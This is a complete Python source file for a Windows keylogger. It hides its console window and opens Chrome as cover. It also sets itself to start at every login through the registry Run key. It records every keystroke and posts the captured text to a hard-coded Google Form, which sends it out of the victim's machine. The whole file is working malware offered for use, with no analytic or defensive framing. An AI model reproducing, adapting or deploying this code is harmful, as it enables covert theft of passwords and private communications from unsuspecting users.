import pythoncom, pyHook
import os
import sys
import urllib,urllib2
import webbrowser
import win32event, win32api, winerror
from _winreg import *

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

hide()

try:
    #Open Google Chrome
    webbrowser.get("C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s").open_new_tab('chrome://newtab')
except:
    pass

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "A.K",0,REG_SZ, new_file_path)

#Remote Google Form logs post
def remote():
    global data
    if len(data)>50:
        url="https://docs.google.com/forms/d/e/1FAIpQLScn5t_YHEXmtyAQi3QlSeHYY72YTW7cNF2Uk-G2gRNVWMHdsg/formResponse" #Specify Google Form URL here
        klog={'entry.1599653143':data} #Specify the Field Name here
        try:
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            data=''
        except:
            pass
    return True

def main():
    addStartup() 
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    remote()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
